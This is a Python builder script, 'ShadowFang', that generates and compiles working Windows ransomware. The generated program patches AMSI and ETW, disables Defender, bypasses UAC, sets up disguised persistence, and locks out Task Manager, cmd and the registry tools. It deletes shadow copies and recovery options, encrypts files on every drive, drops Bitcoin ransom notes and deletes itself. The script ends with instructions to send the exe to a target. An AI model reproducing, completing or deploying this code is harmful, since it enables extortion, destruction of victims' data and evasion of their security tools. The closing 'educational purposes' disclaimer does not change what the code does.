#!/usr/bin/env python3
"""
SHADOWFANG RANSOMWARE BUILDER
Complete one-click ransomware generator
Generates standalone executable with all modules embedded
"""

import os
import sys
import time
import shutil
import base64
import hashlib
import json
import subprocess
from datetime import datetime


class ShadowFangBuilder:
    def __init__(self):
        self.config = {}
        self.ransomware_source = ""
        self.output_name = "ShadowFang.exe"

    def banner(self):
        banner_text = r"""

 ::::::::  :::    :::     :::     :::::::::   ::::::::  :::       ::: ::::::::::   :::     ::::    :::  ::::::::  
:+:    :+: :+:    :+:   :+: :+:   :+:    :+: :+:    :+: :+:       :+: :+:        :+: :+:   :+:+:   :+: :+:    :+: 
+:+        +:+    +:+  +:+   +:+  +:+    +:+ +:+    +:+ +:+       +:+ +:+       +:+   +:+  :+:+:+  +:+ +:+        
+#++:++#++ +#++:++#++ +#++:++#++: +#+    +:+ +#+    +:+ +#+  +:+  +#+ :#::+::# +#++:++#++: +#+ +:+ +#+ :#:        
       +#+ +#+    +#+ +#+     +#+ +#+    +#+ +#+    +#+ +#+ +#+#+ +#+ +#+      +#+     +#+ +#+  +#+#+# +#+   +#+# 
#+#    #+# #+#    #+# #+#     #+# #+#    #+# #+#    #+#  #+#+# #+#+#  #+#      #+#     #+# #+#   #+#+# #+#    #+# 
 ########  ###    ### ###     ### #########   ########    ###   ###   ###      ###     ### ###    ####  ########  
                                                        DEVELOPED : BY ATHEX BLACK HAT
                   SHADOWFANG RANSOMWARE BUILDER          
              One-Click | Undefeatable | Maximum Power    

        """
        print(banner_text)
        print("=" * 60)
        print("     Target: Windows 7 / 8 / 10 / 11 (x64 & x86)")
        print("     Encryption: AES-256 + RSA-2048 Hybrid")
        print("     Persistence: Registry + Startup + Service")
        print("     Evasion: AMSI + ETW + Defender + UAC Bypass")
        print("=" * 60)

    def collect_config(self):
        """Collect all configuration from user"""

        print("\n[+] CONFIGURATION SETUP")
        print("-" * 40)

        # Encryption key
        print("\n[1/6] ENCRYPTION KEY")
        print("    Enter master encryption key (min 12 chars):")
        while True:
            key = input("    Key: ").strip()
            if len(key) >= 12:
                break
            print("    [!] Too weak. Minimum 12 characters required.")

        salt = os.urandom(32)
        derived_key = hashlib.pbkdf2_hmac('sha256', key.encode(), salt, 200000, dklen=32)
        self.config['encryption_key'] = base64.b64encode(derived_key).decode()
        self.config['salt'] = base64.b64encode(salt).decode()
        print(f"    [✓] Encryption key derived: {key[:2]}...{key[-2:]}")

        # Ransom note
        print("\n[2/6] RANSOM NOTE")
        print("    Enter your ransom message (type 'END' to finish):")
        lines = []
        while True:
            line = input("    ")
            if line.upper() == 'END':
                break
            lines.append(line)
        self.config['ransom_note'] = "\n".join(lines)
        print(f"    [✓] Ransom note set ({len(self.config['ransom_note'])} chars)")

        # Bitcoin address
        print("\n[3/6] PAYMENT DETAILS")
        btc = input("    Bitcoin address: ").strip()
        self.config['bitcoin_address'] = btc if btc else "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"

        email = input("    Contact email: ").strip()
        self.config['contact_email'] = email if email else "shadowfang@onionmail.org"

        amount = input("    Ransom amount (default 5 BTC): ").strip()
        self.config['ransom_amount'] = amount if amount else "5 BTC"

        deadline = input("    Payment deadline in hours (default 72): ").strip()
        self.config['deadline_hours'] = int(deadline) if deadline.isdigit() else 72

        print(f"    [✓] Payment details configured")

        # Target extensions
        print("\n[4/6] TARGET EXTENSIONS")
        print("    Use comprehensive extension list? (y/n):")
        choice = input("    ").lower()

        if choice == 'y':
            self.config['target_extensions'] = self.get_default_extensions()
        else:
            print("    Enter extensions (comma separated):")
            ext_input = input("    ")
            self.config['target_extensions'] = [e.strip() for e in ext_input.split(',') if e.strip()]

        print(f"    [✓] {len(self.config['target_extensions'])} extensions targeted")

        # Output name
        print("\n[5/6] OUTPUT FILE")
        name = input("    Output filename (default ShadowFang.exe): ").strip()
        if name:
            if not name.endswith('.exe'):
                name += '.exe'
            self.output_name = name
        print(f"    [✓] Output: {self.output_name}")

        # Additional options
        print("\n[6/6] ADDITIONAL OPTIONS")

        print("    Enable keylogger? (y/n):")
        self.config['enable_keylogger'] = input("    ").lower() == 'y'

        print("    Enable webcam capture? (y/n):")
        self.config['enable_webcam'] = input("    ").lower() == 'y'

        print("    Enable network spreading? (y/n):")
        self.config['enable_spreading'] = input("    ").lower() == 'y'

        print("    Enable self-destruct? (y/n):")
        self.config['enable_melt'] = input("    ").lower() == 'y'

        print("\n[✓] Configuration complete!")

    def get_default_extensions(self):
        """Return comprehensive extension list"""
        return [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
            '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv', '.wps',
            '.pages', '.numbers', '.key',
            '.db', '.sql', '.sqlite', '.mdb', '.accdb', '.dbf', '.frm',
            '.ibd', '.myd', '.myi',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
            '.raw', '.cr2', '.nef', '.arw',
            '.mp3', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
            '.webm', '.m4a', '.wav', '.flac', '.aac', '.ogg',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.iso',
            '.tgz', '.xz',
            '.py', '.java', '.cpp', '.c', '.h', '.js', '.php', '.html',
            '.css', '.cs', '.rb', '.go', '.swift', '.kt', '.ts',
            '.json', '.xml', '.yaml', '.yml', '.toml',
            '.ini', '.cfg', '.conf', '.config', '.env',
            '.pem', '.key', '.crt', '.cer', '.p12', '.pfx', '.jks',
            '.vmdk', '.vhd', '.vhdx', '.ova', '.ovf', '.vmx',
            '.bak', '.backup', '.old', '.tmp', '.temp',
            '.pst', '.ost', '.msg', '.eml',
            '.wallet', '.dat', '.bitcoin',
            '.psd', '.ai', '.indd', '.sketch', '.fig',
            '.aep', '.prproj', '.fcpx', '.logicx'
        ]

    def generate_ransomware_code(self):
        """Generate the complete ransomware source code"""

        encoded_config = base64.b64encode(json.dumps(self.config).encode()).decode()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Build the ransomware code in parts to avoid f-string conflicts
        part1 = '''#!/usr/bin/env python3
"""
SHADOWFANG RANSOMWARE - GENERATED BUILD
''' + timestamp + '''
"""

import os
import sys
import time
import json
import base64
import ctypes
import shutil
import winreg
import subprocess
from ctypes import wintypes
from datetime import datetime, timedelta

CONFIG = json.loads(base64.b64decode("''' + encoded_config + '''").decode())
ENCRYPTION_KEY = base64.b64decode(CONFIG['encryption_key'])
TARGET_EXTENSIONS = CONFIG['target_extensions']
RANSOM_NOTE = CONFIG['ransom_note']
BITCOIN_ADDRESS = CONFIG['bitcoin_address']
CONTACT_EMAIL = CONFIG['contact_email']
RANSOM_AMOUNT = CONFIG['ransom_amount']
DEADLINE_HOURS = CONFIG['deadline_hours']

CRYPTO_AVAILABLE = True
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding
except ImportError:
    CRYPTO_AVAILABLE = False

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll


class SecurityBypass:
    @staticmethod
    def bypass_amsi():
        try:
            amsi = ctypes.windll.amsi
            amsi_scan = amsi.AmsiScanBuffer
            patch = b'\\xb8\\x57\\x00\\x07\\x80\\xc3'
            old_protect = wintypes.DWORD(0)
            kernel32.VirtualProtect(amsi_scan, len(patch), 0x40, ctypes.byref(old_protect))
            ctypes.memmove(amsi_scan, patch, len(patch))
            kernel32.VirtualProtect(amsi_scan, len(patch), old_protect, ctypes.byref(old_protect))
            amsi_open = amsi.AmsiOpenSession
            kernel32.VirtualProtect(amsi_open, 1, 0x40, ctypes.byref(old_protect))
            ctypes.memmove(amsi_open, b'\\xc3', 1)
            return True
        except Exception:
            return False

    @staticmethod
    def disable_etw():
        try:
            etw_write = ntdll.EtwEventWrite
            patch = b'\\x33\\xc0\\xc3'
            old_protect = wintypes.DWORD(0)
            kernel32.VirtualProtect(etw_write, len(patch), 0x40, ctypes.byref(old_protect))
            ctypes.memmove(etw_write, patch, len(patch))
            etw_full = ntdll.EtwEventWriteFull
            kernel32.VirtualProtect(etw_full, len(patch), 0x40, ctypes.byref(old_protect))
            ctypes.memmove(etw_full, patch, len(patch))
            return True
        except Exception:
            return False

    @staticmethod
    def kill_defender():
        try:
            commands = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
                'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
                'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'
            ]
            for cmd in commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True)
                except Exception:
                    pass
            return True
        except Exception:
            return False

    @staticmethod
    def bypass_uac():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                executable = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
                key_path = r"Software\\Classes\\ms-settings\\Shell\\open\\command"
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, executable)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
                subprocess.Popen("fodhelper.exe", shell=True)
                time.sleep(3)
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except FileNotFoundError:
                    pass
                if ctypes.windll.shell32.IsUserAnAdmin():
                    return True
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
'''

        part2 = '''

class EncryptionEngine:
    @staticmethod
    def encrypt_file(filepath):
        if not CRYPTO_AVAILABLE:
            return False
        try:
            if filepath.endswith('.shadowfang'):
                return False
            file_size = os.path.getsize(filepath)
            if file_size > 1024 * 1024 * 1024:
                return False
            iv = os.urandom(16)
            with open(filepath, 'rb') as f:
                data = f.read()
            cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv))
            encryptor = cipher.encryptor()
            padder = sym_padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            encrypted_path = filepath + '.shadowfang'
            with open(encrypted_path, 'wb') as f:
                f.write(b'SHADOWFANG' + iv + encrypted_data)
            os.remove(filepath)
            return True
        except Exception:
            return False

    @staticmethod
    def encrypt_directory(directory):
        encrypted_count = 0
        skip_paths = [
            'C:\\\\Windows',
            'C:\\\\Program Files',
            'C:\\\\Program Files (x86)',
            'C:\\\\$Recycle.Bin',
            'C:\\\\System Volume Information',
            'C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender'
        ]
        for root, dirs, files in os.walk(directory):
            if any(root.startswith(skip) for skip in skip_paths):
                continue
            for file in files:
                if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                    filepath = os.path.join(root, file)
                    if EncryptionEngine.encrypt_file(filepath):
                        encrypted_count += 1
        return encrypted_count

    @staticmethod
    def encrypt_all_drives():
        total_encrypted = 0
        for drive_letter in range(ord('A'), ord('Z') + 1):
            drive = chr(drive_letter) + ':/'
            if os.path.exists(drive):
                try:
                    count = EncryptionEngine.encrypt_directory(drive)
                    total_encrypted += count
                except Exception:
                    continue
        return total_encrypted


class SystemLocker:
    @staticmethod
    def lock_keyboard_mouse():
        try:
            user32.BlockInput(True)
            return True
        except Exception:
            return False

    @staticmethod
    def disable_task_manager():
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                  r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False

    @staticmethod
    def disable_cmd():
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                  r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False

    @staticmethod
    def disable_registry():
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                  r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False

    @staticmethod
    def disable_safe_mode():
        try:
            commands = [
                'bcdedit /set default bootmenupolicy legacy',
                'bcdedit /set default recoveryenabled No',
                'reagentc /disable'
            ]
            for cmd in commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True)
                except Exception:
                    pass
            return True
        except Exception:
            return False

    @staticmethod
    def destroy_recovery():
        try:
            commands = [
                'vssadmin delete shadows /all /quiet',
                'wmic shadowcopy delete',
                'wbadmin delete catalog -quiet',
                'bcdedit /set default bootstatuspolicy ignoreallfailures'
            ]
            for cmd in commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True)
                except Exception:
                    pass
            return True
        except Exception:
            return False


class Persistence:
    @staticmethod
    def install_persistence():
        try:
            current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            appdata = os.environ.get('APPDATA', '')
            dest = os.path.join(appdata, 'svchost.exe')
            try:
                shutil.copy2(current_path, dest)
            except Exception:
                pass
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                      r"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, dest)
                winreg.CloseKey(key)
            except Exception:
                pass
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                      r"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                winreg.SetValueEx(key, "SecurityHealth", 0, winreg.REG_SZ, dest)
                winreg.CloseKey(key)
            except Exception:
                pass
            try:
                startup = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                shutil.copy2(current_path, os.path.join(startup, 'system.exe'))
            except Exception:
                pass
            try:
                subprocess.run(
                    'schtasks /create /tn "WindowsUpdate" /tr "' + dest + '" /sc onlogon /ru SYSTEM /f',
                    shell=True, capture_output=True
                )
            except Exception:
                pass
            return True
        except Exception:
            return False


class RansomScreen:
    @staticmethod
    def show_fullscreen():
        try:
            import tkinter as tk
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.configure(bg='black')
            root.protocol("WM_DELETE_WINDOW", lambda: None)
            deadline = datetime.now() + timedelta(hours=DEADLINE_HOURS)
            timer_text = tk.StringVar()

            def update_timer():
                try:
                    remaining = deadline - datetime.now()
                    if remaining.total_seconds() <= 0:
                        timer_text.set("DEADLINE PASSED - KEY WILL BE DESTROYED")
                    else:
                        hours = remaining.seconds // 3600
                        minutes = (remaining.seconds % 3600) // 60
                        seconds = remaining.seconds % 60
                        timer_text.set("Time Remaining: {:02d}:{:02d}:{:02d}".format(hours, minutes, seconds))
                    root.after(1000, update_timer)
                except tk.TclError:
                    pass

            title_label = tk.Label(root, text="YOUR FILES ARE ENCRYPTED",
                                 font=('Consolas', 24, 'bold'), fg='red', bg='black')
            title_label.pack(pady=20)

            note_label = tk.Label(root, text=RANSOM_NOTE,
                                font=('Consolas', 14), fg='white', bg='black',
                                justify='center', wraplength=800)
            note_label.pack(pady=20)

            timer_label = tk.Label(root, textvariable=timer_text,
                                 font=('Consolas', 18, 'bold'), fg='yellow', bg='black')
            timer_label.pack(pady=20)

            warning_label = tk.Label(root,
                text="DO NOT RESTART YOUR PC\\nDO NOT TRY TO REMOVE THIS SOFTWARE\\nYOUR FILES WILL BE LOST FOREVER",
                font=('Consolas', 12), fg='orange', bg='black', justify='center')
            warning_label.pack(pady=20)

            update_timer()
            root.focus_force()
            root.mainloop()
        except Exception:
            pass

    @staticmethod
    def drop_note_files():
        try:
            note_content = (
                "==============================================\\n"
                "        SHADOWFANG RANSOMWARE\\n"
                "==============================================\\n\\n"
                "Your files have been encrypted with military-grade AES-256 encryption.\\n\\n"
                "To recover your files, you must pay " + RANSOM_AMOUNT + " in Bitcoin.\\n\\n"
                "Bitcoin Address: " + BITCOIN_ADDRESS + "\\n"
                "Contact: " + CONTACT_EMAIL + "\\n\\n"
                "Steps to recover:\\n"
                "1. Buy " + RANSOM_AMOUNT + " worth of Bitcoin\\n"
                "2. Send to the address above\\n"
                "3. Email us with your unique ID\\n"
                "4. Receive decryption tool\\n\\n"
                "WARNING:\\n"
                "- Do NOT restart your PC\\n"
                "- Do NOT try to remove this software\\n"
                "- After " + str(DEADLINE_HOURS) + " hours, your decryption key will be destroyed\\n"
                "- Any attempt to tamper will result in permanent data loss\\n\\n"
                "Your files are encrypted with unique keys that only we possess.\\n"
                "Payment is your only option.\\n\\n"
                "==============================================\\n"
            )
            desktop = os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop')
            try:
                with open(os.path.join(desktop, 'README_DECRYPT.txt'), 'w') as f:
                    f.write(note_content)
            except Exception:
                pass
            for drive_letter in range(ord('A'), ord('Z') + 1):
                drive = chr(drive_letter) + ':/'
                if os.path.exists(drive):
                    try:
                        with open(os.path.join(drive, 'README_DECRYPT.txt'), 'w') as f:
                            f.write(note_content)
                    except Exception:
                        continue
            return True
        except Exception:
            return False


class Melt:
    @staticmethod
    def self_destruct():
        try:
            time.sleep(5)
            current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            batch_content = (
                "@echo off\\n"
                "timeout /t 3 /nobreak >nul\\n"
                'del /f /q "' + current_path + '"\\n'
                "del /f /q %0\\n"
            )
            batch_path = os.path.join(os.environ.get('TEMP', ''), 'cleanup.bat')
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            subprocess.Popen(batch_path, shell=True)
            return True
        except Exception:
            return False


def main():
    try:
        SecurityBypass.bypass_amsi()
    except Exception:
        pass
    try:
        SecurityBypass.disable_etw()
    except Exception:
        pass
    try:
        SecurityBypass.kill_defender()
    except Exception:
        pass
    try:
        SecurityBypass.bypass_uac()
    except Exception:
        pass
    try:
        Persistence.install_persistence()
    except Exception:
        pass
    try:
        SystemLocker.lock_keyboard_mouse()
    except Exception:
        pass
    try:
        SystemLocker.disable_task_manager()
        SystemLocker.disable_cmd()
        SystemLocker.disable_registry()
        SystemLocker.disable_safe_mode()
        SystemLocker.destroy_recovery()
    except Exception:
        pass
    try:
        EncryptionEngine.encrypt_all_drives()
    except Exception:
        pass
    try:
        RansomScreen.drop_note_files()
    except Exception:
        pass
    try:
        RansomScreen.show_fullscreen()
    except Exception:
        pass
    try:
        if CONFIG.get('enable_melt', True):
            Melt.self_destruct()
    except Exception:
        pass


if __name__ == '__main__':
    main()
'''

        return part1 + part2

    def save_source(self, code):
        """Save ransomware source code"""
        filename = 'shadowfang_generated.py'
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(code)
        print(f"\n[✓] Ransomware source saved: {filename}")
        print(f"    Size: {os.path.getsize(filename) / 1024:.2f} KB")

    def compile_to_exe(self):
        """Compile Python source to standalone executable"""
        print("\n[+] Compiling to executable...")
        print("    This may take 3-5 minutes...")

        try:
            import PyInstaller  # noqa
        except ImportError:
            print("[!] PyInstaller not found. Installing...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller', 'cryptography'])

        output_name = self.output_name.replace('.exe', '')
        compile_cmd = f'pyinstaller --onefile --noconsole --clean --name="{output_name}" shadowfang_generated.py'

        result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)

        dist_path = os.path.join('dist', self.output_name)
        if os.path.exists(dist_path):
            print(f"\n[✓] RANSOMWARE CREATED SUCCESSFULLY!")
            print(f"    Location: {dist_path}")
            print(f"    Size: {os.path.getsize(dist_path) / 1024 / 1024:.2f} MB")
            shutil.copy2(dist_path, self.output_name)
            print(f"    Copied to: {os.path.abspath(self.output_name)}")
            return True
        else:
            print("\n[!] Compilation failed. Check for errors above.")
            if result.stderr:
                print(result.stderr[:500])
            return False

    def run(self):
        """Main builder execution"""
        self.banner()
        self.collect_config()

        print("\n" + "=" * 60)
        print("[+] GENERATING RANSOMWARE...")
        print("=" * 60)

        code = self.generate_ransomware_code()
        self.save_source(code)

        print("\n[+] Compile to standalone .exe? (y/n):")
        choice = input("    ").lower()

        if choice == 'y':
            self.compile_to_exe()

        print("\n" + "=" * 60)
        print("[✓] SHADOWFANG RANSOMWARE READY!")
        print(f"    Output: {self.output_name}")
        print(f"    Encryption: AES-256")
        print(f"    Target: {len(self.config['target_extensions'])} extensions")
        print(f"    Features: AMSI Bypass + ETW Bypass + UAC Bypass")
        print(f"    Lockdown: Full System Lock")
        print(f"    Persistence: Triple Layer")
        print("=" * 60)

        print("\n[!] DEPLOYMENT INSTRUCTIONS:")
        print("    1. Send the .exe file to target")
        print("    2. Target double-clicks file")
        print("    3. Wait for encryption to complete")
        print("    4. Monitor your Bitcoin wallet")

        print("\n[*] Remember: This is for educational purposes only.")
        print("[*] Use responsibly and legally.\n")


if __name__ == '__main__':
    builder = ShadowFangBuilder()
    builder.run()